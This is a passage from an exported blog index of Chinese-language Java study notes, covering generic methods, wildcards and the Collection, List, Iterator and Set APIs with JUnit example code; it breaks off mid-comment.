System.out.println(\"show\");\n//    }\n\n//    public static void show2(){\n    // 编译不通过\n//       try{\n//\n//       }catch (T t){\n//\n//       }\n//    }\n\n\n    //泛型方法：在方法中出现了泛型的结构，泛型参数与类的泛型参数没有任何关系\n    //换句话说：泛型方达所属的类是不是泛型类都没有关系。\n    //泛型方法可以声明为静态的。原因泛型参数是在调用方法时确定的，并非在实例化时确定的\n    public <E> List<E> copyFromArrayToList(E[] arr){  // E类型的数组, 前面也要加<E>，不然编译器会认为E是我们自定义的一个类呢\n//    public static <E> List<E> copyFromArrayToList(E[] arr){  // 这里可以加static的哦\n        ArrayList<E> list = new ArrayList<>();\n        for(E e: arr){\n            list.add(e);\n        }\n        return list;\n\n    }\n\n}\n\n```\n\n```java\n    //测试泛型方法\n    @Test\n    public void test5(){\n        Order<String> order = new Order<String>(\"orderAA\", 1001, \"我是泛型小实例1\");\n        Integer[] arr = new Integer[]{1,2,3,4};\n        // 泛型方法在调用时，指明泛型参数的类型（与泛型类的类型是没有关系的）\n        List<Integer> list = order.copyFromArrayToList(arr);\n        System.out.println(list);\n        \n    }\n```\n\n![自定义泛型方法](http://image.xpshuai.cn/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%9B%E5%9E%8B%E6%96%B9%E6%B3%95.png)\n\n\n\n\n\n**泛型类和泛型方法情景举例：**\n\nDAO(操作表的共性操作)\n\n```java\npackage cn.xpshuai.java1;\n\nimport java.util.List;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 15:24\n * @功能：模拟\n * DAO: data(base) access object\n *   定义了一些通用的数据库的操作方法\n *\n * 数据库中一个表对应java的一个类\n *\n */\npublic class DAO <T>{  //\n\n    //删除一条记录\n    public void add(T t){\n\n    }\n\n    //删除一条记录\n    public boolean remove(int index){\n        return false;\n    }\n\n    //修改一条记录\n    public void update(int index, T t){\n\n    }\n\n    //查询一条记录\n    public T getIndex(int index){\n        return null;\n    }\n\n    //查询多条记录\n    public List<T> getList(int index){\n        return null;\n\n    }\n\n    //泛型方法\n    // 举例:获取表中一共有多少条记录?获取最大的员工入职时间?\n    public <E> E getValue(){\n        return null;\n    }\n}\n\n```\n\n子类(只能具体操作某个表的类):\n\n```java\npackage cn.xpshuai.java1;\n\n//这个继承DAO，写具体的对Customer的数据库的操作\npublic class CustomerDAO extends DAO<Customer>{  //专门操作Customer表\n}\n\n```\n\n子类(某个数据表对应一个类):\n\n```java\npackage cn.xpshuai.java1;\n\npublic class Customer {  //此类对应数据库中的一个表\n}\n\n```\n\n\n\n操作：\n\n```java\n//测试例子(DAO)\n@Test\npublic void testDao(){\n    CustomerDAO dao1 = new CustomerDAO();\n    dao1.add(new Customer());//\n    List<Customer> list = dao1.getList(1);\n}\n```\n\n\n\n\n\n### 泛型在继承上的体现\n\n```\n类A是类B的父类，G<A>和G<B>不具备子父类关系，二者是并列关系\n补充：类A是类B的父类/接口，A<G>与<G>也具备子父类/接口关系\n```\n\n```java\npackage cn.xpshuai.java2;\n\nimport org.junit.Test;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 15:38\n * @功能：\n *\n * 1.泛型在继承方面的体现\n *\n *\n * 2.通配符的使用\n *\n *\n *\n *\n */\npublic class GenericTest {\n    /*\n    1.泛型在继承方面的体现\n    类A是类B的父类，G<A>和G<B>不具备子父类关系，二者是并列关系\n    补充：类A是类B的父类/接口，A<G>与<G>也具备子父类/接口关系\n\n     */\n    @Test\n    public void test(){\n        //在类上的展示, 类似多态的展示\n        Object obj = null;\n        String str = null;\n\n        obj = str;\n\n        //在数组上的展示\n        Object[] arr1 = null;\n        String[] arr2 = null;\n        arr1 = arr2;\n\n        // 编译不通过\n        List<Object> l1 = null;\n        List<String> l2 = null;\n        //此时的l1和l2的类型不具有子父关系\n//        l1 = l2;  //错误\n    }\n\n    @Test\n    public void test1(){\n        List<String> list1 = null;\n        ArrayList<String> list2 = null;\n        list1 = list2;\n\n    }\n\n\n}\n\n```\n\n\n\n\n\n\n\n### 通配符的使用\n\n![通配符的使用](http://image.xpshuai.cn/%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E4%BD%BF%E7%94%A8.png)\n\n```java\npackage cn.xpshuai.java2;\n\nimport org.junit.Test;\n\nimport java.util.ArrayList;\nimport java.util.Iterator;\nimport java.util.List;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 15:38\n * @功能：\n *\n * 1.泛型在继承方面的体现\n *\n *\n * 2.通配符的使用\n *\n \n */\npublic class GenericTest {\n    /*\n    1.泛型在继承方面的体现\n    类A是类B的父类，G<A>和G<B>不具备子父类关系，二者是并列关系\n    补充：类A是类B的父类/接口，A<G>与<G>也具备子父类/接口关系\n\n     */\n    @Test\n    public void test(){\n        //在类上的展示, 类似多态的展示\n        Object obj = null;\n        String str = null;\n\n        obj = str;\n\n        //在数组上的展示\n        Object[] arr1 = null;\n        String[] arr2 = null;\n        arr1 = arr2;\n\n        // 编译不通过\n        List<Object> l1 = null;\n        List<String> l2 = null;\n        //此时的l1和l2的类型不具有子父关系\n//        l1 = l2;  //错误\n    }\n\n    @Test\n    public void test1(){\n        List<String> list1 = null;\n        ArrayList<String> list2 = null;\n        list1 = list2;\n\n    }\n\n\n    /*\n    2.通配符的使用\n    通配符：?\n\n    类A是类B的父类，且G<A>和G<B>不具备子父类关系，二共同的父类是: G<?>\n\n     */\n    @Test\n    public void test2(){\n        List<Object> l1 = null;\n        List<String> l2 = null;\n\n        List<?> list = null;   //作为前两个的公共父类,实现公共的调用\n        list = l1;\n        list = l2;\n\n        printer(l1);\n        printer(l2);\n\n\n        //\n        List<String> list3 = new ArrayList<>();\n        list3.add(\"AA\");\n        list3.add(\"BB\");\n        list3.add(\"CC\");\n        list = list3;\n        //添加(写入)：对于List<?>，就不能向其内部添加数据了\n        //除了添加null之外, 仅此而已\n//        list.add(\"D\");\n        list.add(null);\n\n        //获取(读取):允许读取数据，读取的数据类型为Object\n        Object o = list.get(0);\n        System.out.println(o); // 但是是允许读的\n\n\n    }\n    // 加上通配符，这样就可以调用一个公共的方法了\n    public void printer(List<?> list){\n        Iterator<?> iterator = list.iterator();\n        while (iterator.hasNext()){\n            Object obj = iterator.next();\n            System.out.println(obj);\n        }\n    }\n\n}\n\n```\n\n\n\n**有限制条件的通配符的使用**：\n\n![有限制条件的通配符](http://image.xpshuai.cn/%E6%9C%89%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E7%9A%84%E9%80%9A%E9%85%8D%E7%AC%A6.png)\n\n```java\n    /*\n    3.有限制条件的通配符的使用\n        ? extends A:\n            G<? extends A> 可以作为G<A>和G<B>的父类，其中B是A的子类\n        ? super A:\n            G<? super A> 可以作为G<A>和G<B>的父类, 其中G<B>为A的父类\n\n\n     */\n    @Test\n    public void test3(){\n        //以List为例\n        List<? extends Person> l1 = null;  // <=\n        List<? super Person> l2 = null;    // >=\n\n        List<Students> l3 = null;\n        List<Person> l4 = null;\n        List<Object> l5 = null;\n\n\n        l1 = l3;\n        l1 = l4;\n//        l1 = l5;\n\n//        l2 = l3;\n        l2 = l4;\n        l2 = l5;\n\n    }\n\n\n```\n\n```java\npackage cn.xpshuai.java2;\n\npublic class Students extends Person{\n    \n}\n\n```\n\n\n\n\n\n### 泛型应用举例\n\n泛型嵌套：\n\n![泛型嵌套举例](http://image.xpshuai.cn/%E6%B3%9B%E5%9E%8B%E5%B5%8C%E5%A5%97%E4%B8%BE%E4%BE%8B.png)\n\n\n\n```bash\nlist1.forEach(System.out::println)\t# jdk8新特性\n```\n\n","tags":["泛型"],"categories":["Java学习"]},{"title":"Java学习之集合","url":"%2Fposts%2F29903%2F","content":"\n\n\n> 这章很重要的哦\n\n\n\n### Java集合框架概述\n\n- 为了方便对多个对象的操作，就需要对对象进行存储\n- 且使用Array存储对象方面存在一定**弊端**。而Java集合就像一种容器，可以动态地把**多个对象**的引用放入容器\n  - 数组在内存存储方面的特点:\n    - 数组初始化以后，长度就确定了；\n    - 数组声明的类型，就决定了进行元素初始化时的类型。\n  - 数组在存储数据方面的弊端:\n    - 数组初始化以后，长度就不可变了，不便于扩展；\n    - 数组中提供的属性和方法少，不便于进行添加、删除、插入等操作，且效率不高。同时无法直接获取存储元素的个数；\n    - 数组存储的数据是有序的、可以重复的。---->存储数据的特点单一\n\n\n\n**Java集合可分为Collection和 Map 两种体系:** \n\n- Collection接口:单列数据，定义了存取一组对象的方法的集合\n  - List: 元素有序、可重复的集合\n  - Set: 元素无序、不可重复的集合\n- Map接口:双列数据，保存具有映射关系“key-value对”的集合\n\n\n\n**Java集合框架概述：**\n\n![collection接口继承树](http://image.xpshuai.cn/collection%E6%8E%A5%E5%8F%A3%E7%BB%A7%E6%89%BF%E6%A0%91.png)\n\n\n\n![map接口继承树](http://image.xpshuai.cn/map%E6%8E%A5%E5%8F%A3%E7%BB%A7%E6%89%BF%E6%A0%91.png)\n\n\n\n\n\n```java\n/**\n *学完之后，最基本要知道，什么类型的数据适合用什么样的集合存储\n *\n * 一、集合框架的概述\n * 1.集合、数组都是对多个数据进行存储操作的结构，简称Java容器。\n *此时的存储，主要指的是内存层面的存储，不涉及持久化的存储(.txt，jpg，avi，数据库...)\n *\n * 2.数组在存储多个数据方面的特点：\n *  > 一旦初始化，其长度就确定了\n *  > 数组一旦定义好，其元素的类型也就确定了,如元素类型:String[] arr2; int[] arr1; Object[] arr2;\n *\n * 3.相比集合，数组在存储多个数据方面的特点：\n *  > 一旦初始化，其长度就确定了, 无法扩容\n *  > 数组中提供的方法非常有限，对于添加删除插入元素的操作非常不方便，同时效率不高\n *  > 获取数组中实际元素的个数，没有现成的属性或方法\n *  > 数组存储数据的特点: 有序、可重复，对于无序、不可重复的需求不可满足\n *\n *\n *  二、集合框架\n *  | ----- Collection接口: 单列数据，定义了存取一组对象的方法的集合\n *        |---- List接口(\"动态数据\"): 存储元素有序、可重复的数据\n *             |---- ArrayList、LinkedList、Vector(这三个面试多)\n *        |---- Set接口(类似高中讲的\"集合\":无序、确定性、互异性): 存储元素元素无序、不可重复\n *             |---- HashSet、LinkedHashSet、TreeSet\n * | ----- Map接口: 双列数据，保存具有映射关系的\"key-value\"对的集合(类似高中函数: y = f(x)，不同key可以指向相同的value)\n *             |---- HashMap(面试问得多)、LinkedHashMap、TreeMap、Hashtable、Properties\n *             \n *\n * \n *\n */\n```\n\n\n\n\n\n### <font color=red>Collection接口</font>\n\n> 单列数据，定义了存取一组对象的方法的集合\n\n\n\n#### Collection接口的方法\n\n\n\n```java\n/* \n*三、Collection接口中的方法\n * \n * 结论：\n *向Collection接口的试下类的接口中添加数据obj时，要求boj所在类要重写equals()\n */\n\npublic class MyCollectionTest {\n/*\n    Collection接口中的方法\n */\n    @Test\n    public void test1(){\n        //这里使用ArrayList用多态的方法来做的测试\n        Collection coll = new ArrayList();  // ArrayList 是有序的\n\n        //1.add(Object e): 将元素e添加到集合中\n        coll.add(\"AA\");\n        coll.add(\"BB\");\n        coll.add(123); //自动装箱\n        coll.add(new Date());\n        coll.add(new Person(\"Tom\", 20));\n\n        //2.size(): 获取添加的元素的个数\n        System.out.println(coll.size());\n\n        //3.addAll: 把另一集合中的元素添加到当前的集合中\n        Collection coll2 = new ArrayList();\n        coll.add(456);\n        coll.add(\"CC\");\n        coll.addAll(coll2);\n        System.out.println(coll);\n\n\n        //4.isEmpty(): 判断当前集合是否为空(是否有元素, size是否为0)\n        System.out.println(coll.isEmpty());\n\n        //5.clear():清空集合元素\n        coll2.clear();\n        System.out.println(coll2);\n\n        //6.contains(Object obj): 判断当前集合是否包含obj, 判断的是内容而不是地址\n        //在判断时，会调用obj对象所在类的equals()，要求我们自己重写一下\n        boolean contains = coll.contains(123);\n        System.out.println(contains);\n        System.out.println(coll.contains(new String(\"Tom\"))); // true, 判断的是内容,  调用的equals方法\n        System.out.println(coll.contains(new Person(\"Tom\", 20))); // false, 但是如果我们重写了Person的equals方法，然后就可以按照自己的想法变为true了\n\n        // 7.containsAll(Collection coll): 判断形参中的所有元素是否都存在于当前集合中\n        // 跟contains的判断是相等的，都跟实现类中的equals()有关\n        Collection coll3 = Arrays.asList(123,456);\n        coll.containsAll(coll3);\n\n        // 8.remove(Object obj): 从集合中移除某个元素, 成功返回true\n        // 仍然需要重写equals()方法，因为在移除之前需要判断元素是否在集合中\n        coll.remove(123);\n        coll.remove(new Person(\"Tom\", 20)); // 在Person中需重写equals()\n\n//        9.removeAll(Collection coll4): 从当前集合中移除某个集合中的元素(差集)\n        coll.removeAll(coll3);\n        System.out.println(coll);\n\n//        10.retainAll(Collection coll4):返回布尔型的值，修改当前集合为两个集合的交集\n        Collection coll4 = Arrays.asList(132,789,123);\n        coll.retainAll(coll4);\n\n//        11.equals(Object bj): 比较两个集合是否相等，依次逐个元素比较(这里ArrayList是有序的，所以顺序不一样也不行)\n        System.out.println(coll.equals(coll3));\n\n//        12.hashCode(): 返回当前对象的hash值\n        System.out.println(coll.hashCode());\n\n//        13.集合 --> 数组: toArray()\n        Object[] arr = coll.toArray();\n        for (int i = 0; i < arr.length; i++) {\n            System.out.println(arr[i]);\n        }\n\n//        14.数组 --> 集合: 调用Arrays类的静态方法asList()\n        List<String> li = Arrays.asList(new String[]{\"AA\", \"BB\", \"CC\"});\n        System.out.println(li);\n        //Note: 使用时候注意\n        List arr1 = Arrays.asList(new int[]{111,222}); //这种写法会被当做一个元素\n        List arr2 = Arrays.asList(111,222); //直接写这就行\n        List arr3 = Arrays.asList(new Integer[]{111,222}); //或者用Integer\n        System.out.println(arr1.size());\n        System.out.println(arr2.size());\n        System.out.println(arr3.size());\n\n//        15.iterator: 返回Iterator接口的实例，用于遍历集合元素，下一部分来测试\n\n\n    }\n\n}\n\n\n```\n\n\n\n\n\n#### lterator迭代器接口\n\n- lteralor对象称为迭代器(设计模式的一种)，主要用于遍历Collection集合中的元素。\n- GOF给迭代器模式的定义为:提供一种方法访问一个容器(container)对象中各个元素，而又不需暴露该对象的内部细节。**迭代器模式，就是为容器而生**。类似于“公交车上的售票员”、“火车上的乘务员”、“空姐”。\n- Collection接口继承了`java.lang.lterable`接口，该接口有一个`iterator()`方法，那么所有实现了Collection接口的集合类都有一个iterator()方法，用以返回一个实现了lterator接口的对象。\n- **Iterator仅用于遍历集合，lterator木身并不提供承装对象的能力**。如果需要创建lterator对象，则必须有一个被迭代的集合。\n- **集合对象每次调用iterator()方法都得到一个全新的迭代器对象**，默认游标都在集合的第一个元素之前。\n\n![迭代器的执行原理](http://image.xpshuai.cn/%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%9A%84%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86.png)\n\n\n\n**Iterator迭代器接口remove()方法**\n\n```java\nIterator iterator2 = coll.iterator();\nwhile (iterator2.hasNext()){\n    Object obj = iterator2.next();  \n    if(\"Tom\".equals(obj)){\n        iterator2.remove();  \n    }\n}\n```\n\n\n\n**Note:**\n\n- lterator可以删除集合的元素，但是是遍历过程中通过迭代器对象的remove方法，不是集合对象的remove方法。\n\n- 如果还未调用next)或在上一次调用next方法之后已经调用了remove方法，再调用remove都会报llegalStateException。\n\n  \n\n```java\n/*\n    集合元素的遍历操作，使用Iterator(迭代器接口)\n    1.内部的方法：hasNext()与next()配合去使用\n    2.每次调用iterator()，就会是一个全新的迭代器对象，指针永远指向开头\n    3.内部定义了remove(),可以在遍历的时候，删除集合中的元素。此方法不同于集合直接使用remove()\n    4.在调用next()之前，不要调用remove()；移除集合中某元素的操作, 不能写两次\n */\n    @Test\n    public void test2(){\n        Collection coll = new ArrayList();\n        coll.add(\"AA\");\n        coll.add(\"BB\");\n        coll.add(123);\n        coll.add(new Date());\n        coll.add(new Person(\"Tom\", 20));\n\n        Iterator iterator = coll.iterator();   // 装东西的还是原来的集合，Iterator并不是容器，只是迭代器\n        // next()\n//        System.out.println(iterator.next());\n        // 不推荐这么写\n//        for (int i = 0; i < coll.size(); i++) {\n//            System.out.println(iterator.next());\n//        }\n\n        // 【推荐写法】:\n        // hasNext() 与 next()配合\n        while (iterator.hasNext()){\n            // next(): 1.指针先下移；2.将下移以后集合位置上的元素返回\n            System.out.println(iterator.next());\n        }\n\n\n        //错误写法1:\n//        while (iterator.next() != null){  //这里先指针下移了，所以会跳着输出，且会出现NoSuchElementException\n//            System.out.println(iterator.next());\n//        }\n\n        //错误写法2：\n        // 每次调用iterator()，就会是一个全新的迭代器对象，指针永远指向开头\n//        while ((coll.iterator()).hasNext()){  //死循环，不断输出第一个元素\n//            System.out.println(iterator.next());\n//        }\n\n\n        //使用Iterator中的remove()\n        Iterator iterator2 = coll.iterator();\n        while (iterator2.hasNext()){\n            Object obj = iterator2.next();  // 在调用next()之前，不要调用remove()\n            if(\"Tom\".equals(obj)){\n                iterator2.remove();  //移除集合中某元素的操作, 不能写两次\n            }\n        }\n        //然后再查看一下remove之后的元素\n        Iterator iterator3 = coll.iterator();\n        while (iterator3.hasNext()){\n            System.out.println(iterator3.next());\n        }\n\n    }\n\n```\n\n\n\n#### foreach循环遍历集合和数组元素\n\n```java\n/*\n    foreach 循环遍历集合和数组元素\n    jdk5新增\n\n     */\n@Test\npublic void test3(){\n    Collection coll = new ArrayList();\n    coll.add(\"AA\");\n    coll.add(\"BB\");\n    coll.add(123);\n    coll.add(new Date());\n    coll.add(new Person(\"Tom\", 20));\n\n    //        foreach 循环遍历集合\n    // 格式: for(集合/数组中元素的类型 局部变量: 集合/数组对象)\n    // 内部仍然调用了迭代器\n    for(Object obj: coll){\n        System.out.println(obj);\n\n    }\n\n\n    // foreach 循环遍历数组\n    int[] arr1 = new int[]{11,22,33,44,55};\n    for(int i: arr1){\n        System.out.println(i);\n    }\n\n\n    //练习题：\n    java.lang.String[] arrr = new java.lang.String[]{\"MM\", \"MM\", \"MM\"};\n    //F1:普通for循环\n    for (int i = 0; i < arrr.length; i++) {\n        arrr[i] = \"GG\";\n    }\n\n    for (int i = 0; i < arrr.length; i++) {\n        System.out.println(arrr[i]);   // GG\n    }\n\n    // F2:foreach\n    for(java.lang.String s: arrr){\n        s =\"GG\";  //取出来，给s，s把它给改了，不会修改原有数组的值\n    }\n\n    for (int i = 0; i < arrr.length; i++) {\n        System.out.println(arrr[i]);   // MM\n    }\n\n\n}\n\n```\n\n\n\n\n\n### \n\n#### Collection子接口一: <font color=red>List(重点)</font>\n\n> 元素有序、可重复的集合\n>\n> 看做\"动态数组\"，以后可以用这个来代替数组啦~\n\n\n\n**List接口概述：**\n\n- 鉴于Java中数组用来存储数据的局限性，我们通常使用List替代数组\n- List集合类中元素有序、且可重复，集合中的每个元素都有其对应的顺序索引。\n- List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素。\n- JDK API中List接口的实现类常用的有: ArrayList、LinkedList和Vector。\n\n![JavaList实现类2-LinkedList](http://image.xpshuai.cn/JavaList%E5%AE%9E%E7%8E%B0%E7%B1%BB2-LinkedList.png)\n\n\n\n**源码分析(自己看)**\n\n\n\n**List接口常用方法：**\n\n 除去Collection这种的15个，还有下面几个\n\n```java\n【总结：常用方法】\n    增：add(Object obj)\n    删：remove(int index) /remove(Object obj)\n    改：set(int index, Object ele)\n    查：get(int index)\n    插：add(index, Object ele)\n    长度：size()\n    遍历：1. Iterator迭代器\n         2. foreach\n         3. 普通的循环\n```\n\n如下：\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.util.*;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-26 16:44\n * @功能： Collection子接口一: List\n *\n * 一、list源码框架\n*        |---- List接口: 存储元素有序、可重复的数据 --> \"动态\"数组，替换原有数组\n*             |---- ArrayList: 作为List接口的主要实现类(一般就用它):线程不安全的(但是用的时候一般都扔到synchronizedList()里面就线程安全了)，效率高：底层使用Object[]存储\n *            |----LinkedList: 其次使用的, 对于频繁的插入和删除操作，使用此类效率比ArrayList高，底层使用双向链表存储\n *            |----Vector: 作为List接口的古老实现类: 线程安全的，效率低：底层使用Object[] elemData存储\n *\n * List常用的接口异同：\n * - ArrayList\n * - LinkedList\n * - Vector\n * 同：都实现了list接口，存储数据的特点相同：存储有序的、可重复的数据\n * 不同：\n *\n *\n * 二、源码分析：\n*   1.ArrayList:\n *   jdk7情况下:\n *   ArrayList list = new ArrayList(); //底层创建了长度是10的Object[]数组elementData\n *   list.add(123);//elementData[0]=new Integer(123);\n *   ...\n *   list.add(11);//list.add(11);//如果此次的添加导致底层elementData数组容量不够，则扩容。默认情况下，扩容为原来的容量的1.5倍, 同时需要将原有数组中的数据复制到新的数组中\n *   结论：建议开发中使用带参的构造器: ArrayList list = new ArrayList(int capacity);\n *\n *   jdk8下变化:\n * ArrayList coll1 = new ArrayList();//底层object[]elementData初始化为{}.并没有创建长度为10的数组\n * 第一次调用add()时，才创建长度为10的数组\n * 后续的添加和扩瞳操作与jdk7无异\n *\n * 小结：jdk7中的ArrayList的对象的创建类似于单例的饿汉式，而jdk8中的ArrayList的对象的创建类似于单例的蓝汉式，节省了内存\n *\n *\n*   2.LinkedList:\n *LinkedList coll2 = new LinkedList();\n *\n *\n*   3.Vector:\n *\n *\n *\n *\n * 三、list接口中常用方法\n * 除去Collection这种的15个，还有下面几个\n *\n */\npublic class ListTest {\n    @Test\n    public void test1(){\n        ArrayList coll1 = new ArrayList();\n        LinkedList coll2 = new LinkedList();\n        Vector coll3 = new Vector();\n\n    }\n\n    /*\n    list接口中常用方法\n    除去Collection这种的15个，还有下面几个\n\n\n   【总结：常用方法】\n    增：add(Object obj)\n    删：remove(int index) /remove(Object obj)\n    改：set(int index, Object ele)\n    查：get(int index)\n    插：add(index, Object ele)\n    长度：size()\n    遍历：1. Iterator迭代器\n         2. foreach\n         3. 普通的循环\n\n\n     */\n    @Test\n    public void test2(){\n        ArrayList l1 = new ArrayList(); //就以ArrayList为例\n        l1.add(132);\n        l1.add(132);\n        l1.add(\"aaa\");\n        l1.add(new Person(\"Lisa\", 18));\n        System.out.println(l1);\n\n        // void add(int index, Object obj): 在指定位置插入元素\n        l1.add(2, \"BB\");\n\n        // boolean addAll():在index位置开始将ollention的元素插入\n        List a1 = Arrays.asList(1, 2, 3);\n        l1.addAll(a1);\n        System.out.println(l1.size());\n\n        // Object get(int index): 获取指定位置元素\n        System.out.println(l1.get(0));\n\n        // int indexOf(): 获取元素首次出现的位置，如果不存在返回-1\n        int index = l1.indexOf(132);\n        System.out.println(index);\n        // int lastIndexOf(): 获取元素末次出现的位置，如果不存在返回-1\n        System.out.println(l1.lastIndexOf(\"BB\"));\n\n        // Object remove(int index): 移除指定index位置的元素，并返回此元素\n        Object b = l1.remove(0);\n        System.out.println(b);\n        System.out.println(l1);\n\n        //Object set(int index, Object ele): 返回指定idnex位置的元素为ele\n        l1.set(1, \"CCC\");\n        System.out.println(l1);\n\n        // List subList(int fromIndex, int toIndex): 从集合中返回一个左闭右开的子集合\n        List l2 = l1.subList(1,6);  // 不会对本身list造成影响\n        System.out.println(l2);\n\n\n\n        // 遍历\n//        F1: Iterator迭代器\n        Iterator iterator = l1.iterator();\n        while (iterator.hasNext()){\n            System.out.println(iterator.next());\n        }\n\n//        F2: foreach\n        for(Object obj: l1){\n            System.out.println(obj);\n        }\n\n//        F3:普通for循环\n        for (int i = 0; i < l1.size(); i++) {\n            System.out.println(l1.get(i));\n        }\n    }\n\n\n    @Test\n    public void test3(){\n        \n    }\n\n}\n\n```\n\n\n\n**面试题：**\n\n区分list中remove()方法\n\n```java\n@Test\npublic void test1() {\n    List list = new ArrayList();\n    list.add(1);\n    list.add(2);\n    list.add(3);\n    updateList(list);\n    System.out.println(list);\n}\n\npublic void updateList(List list){\n    //        list.remove(2); // 这样remove的是索引为2的元素\n    list.remove(new Integer(2)); //这样通过封装类的方式, remove的是元素值为2的元素\n}\n```\n\n\n\n\n\n#### Collection子接口二:<font color=red>Set</font>\n\n> 元素无序、不可重复的集合\n>\n> 类似高中讲的\"集合\": 无序性、确定性、互异性\n\n\n\n**Set接口概述：**\n\n- Set接口是Collection的子接口，set接口没有提供额外的方法\n- Set集合不允许包含相同的元素，如果试把两个相同的元素加入同一个Set集合中，则添加操作失败。\n- Set判断两个对象是否相同不是使用==运算符，而是根据equals()方法\n\n\n\n![image-20210127110226609](C:\\Users\\19401\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210127110226609.png)\n\n**Set实现类之一: Hashset**\n\n- HashSet是 Set接口的典型实现，大多数时候使用Set集合时都使用这个实现类;\n\n- HashSet 按Hash算法来存储集合中的元素，因此具有很好的存取、查找、删除性能。\n\n- HashSet具有以下特点:\n\n  - 不能保证元素的排列顺序\n  - HashSet不是线程安全的\n  - 集合元素**可以是null**\n\n- **HashSet集合判断两个元素相等的标准**:两个对象通过 hashCode()方法比较相等，并且两个对象的equals()方法返回值也相等。\n\n- 对于存放在Set容器中的对象，**对应的类一定要重写equals()和hashCode(Objectobj)方法，以实现对象相等规则**。即:“**相等的对象必须具有相等的散列码**”。\n\n  \n\n**重写hashCode()方法的基本原则:** \n\n- 在程序运行时，同一个对象多次调用hashCode()方法应该返回相同的值。\n- 当两个对象的equals()方法比较返回 true 时，这两个对象的hashCode()方法的返回值也应相等。\n- 对象中用作equals()方法比较的Field，都应该用来计算 hashCode值。\n\n\n\n**Set实现类之二: LinkedkashSet: **\n\n- LinkedHashSet是 HashSet的子类\n- LinkedHashSet根据元素的hashCode值来决定元素的存储位置，但它同时使用**双向链表**维护元素的次序，这使得元素看起来是**以插入顺序保存**的。\n- **LinkedHashSet插入性能略低于HashSe**t，但在迭代访问Set里的全部元素时有很好的性能。\n- LinkedHashSet不允许集合元素重复。\n\n\n\n**Set实现类之三:TreeSet: **\n\n- TreeSet是 SortedSet接口的实现类，TreeSet可以确保集合元素处于排序状态。\n\n- TreeSet底层使用**红黑树**结构存储数据\n\n-  TreeSet两种排序方法: **自然排序**和**定制排序**。默认情况下，TreeSet采用自然排序。\n\n- 新增的方法如下:(了解)\n\n  ```java\n  Comparator comparator()\n  Object first()\n  Object last()\n  Object lower(Object e)\n  Object higher(Object e)\n  SortedSet subSet(fromElement, toElement)\n  SortedSet headSet(toElement)\n  SortedSet tailSet(fromElement)\n  ```\n\n\n\n代码如下：\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.util.*;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-27 10:14\n * @功能：\n *\n * 一、set接口的框架结构(使用的有点少)\n *  *  | ----- Collection接口: 单列数据，定义了存取一组对象的方法的集合\n     *    |---- Set接口(类似高中讲的\"集合\":无序、确定性、互异性): 存储元素元素无序、不可重复\n     *        |---- HashSet: 作为set接口的主要实现类；线程不安全，可存储null值\n *                 |---- LinkedHashSet: 作为hashset的子类: 遍历其内部数据时，可以按照添加的顺序遍历\n *            |---- TreeSet: 可以按照添加对象的指定属性进行排序\n *\n *\n * Note:\n * Set接口中没有额外定义新的方法，使用的都是collection中声明过的方法。\n *要求:重写的hashCode()和equals()尽可能保持一致性:相等的对象必须具有相等的散列码\n *     重写两个方法的小技巧：对象中用作equals()方法比较的 Field，都应该用来计算hashCode值\n *对于频繁的遍历操作，LinkedHashSet效率优于HashSet\n *\n *\n *\n * 二、set的无序性和不可重复性\n * 以HashSet为例说明:\n *1.无序性\n *无序性 != 随机性。存储的数据在底层数组中并非按照数组索引的顺序添加，而是根据数据的hash值决定的\n *\n *\n * 2.不可重复性:保证添加的元素按照equals()判断时，不能返回true。即相同的元素只能添加一个\n *\n *\n * 二、添加元素的过程(以HashSet为例)\n * 我们向HashSet中添加元素a,首先调用元素α所在类的hashcode()方法，计算元素α的哈希值，\n * 此哈希值接着通过某种算法计算出在HashSet底层数组中的存放位置（即为:索引位置)，\n * 判断教组此位置上是否已经有元素:\n *     如果此位置上没有其他元素，则元素a添加成功。--->情况1\n *     如果此位置上有其他元素b(或以链表形式存在的多个元素〉，则比较元素a与元素b的hash值:\n *         如果hash值不相同，则元素α添加成功。--->情况2\n *         如果hash值相同，进而需要调用元素α所在类的equals()方法:\n *             equals()返回true,元素α添加失败\n *             equals()返回false,则元素a添加成功。--->情况2\n * 对于添加成功的情况2和情况3而言:元素α与已经存在指定索引位置上数据以链表的方式存储。\n * jdk 7∶元素a放到数组中，指向原来的元素。\n * jdk 8 :原来的元素在数组中，指向元素d\n *总结：七上八下\n *\n *HashSet底层：数组+链表\n *\n *\n *LinkedHashSet:\n *\n *\n *TreeSet\n *\n *\n *\n */\npublic class SetTest {\n    @Test\n    public void test1(){\n        //1.无序性\n        // 2.不可重复性\n        Set set1 = new HashSet(); //以hashset为例\n        set1.add(132);\n        set1.add(465);\n        set1.add(\"AA\");\n        set1.add(new Person(\"Jack\", 18));\n        set1.add(666);\n\n        Iterator iterator = set1.iterator();\n        while (iterator.hasNext()){\n            System.out.println(iterator.next());  // 顺序跟添加的顺序是一样的\n        }\n\n\n\n        // LinkedHashSet的使用\n        // LinkedHashSet作为HashSet的子类，在添加数据的同时，每个数据还维护了两个引用，记录此数据和后一个数据\n        //优点：对于频繁的遍历操作，效率优于HashSet\n        Set set2 = new LinkedHashSet(); //LinkedHashSet\n        set2.add(132);\n        set2.add(465);\n        set2.add(\"AA\");\n        set2.add(new Person(\"Jack\", 18));\n        set2.add(666);\n\n        Iterator iterator2 = set1.iterator();\n        while (iterator2.hasNext()){\n            System.out.println(iterator2.next());  // 顺序跟添加的顺序是一样的\n        }\n\n\n    }\n\n\n    /*\n    1.向TreeSet中添加的数据，要求是相同类的对象\n    2.两种排序方式：自然排序(实现Comparable接口)、定制排序(Comparator)\n    3.自然排序中，比较两个对象是否相同的标准为：compareTo()返回0，不再是equals()\n    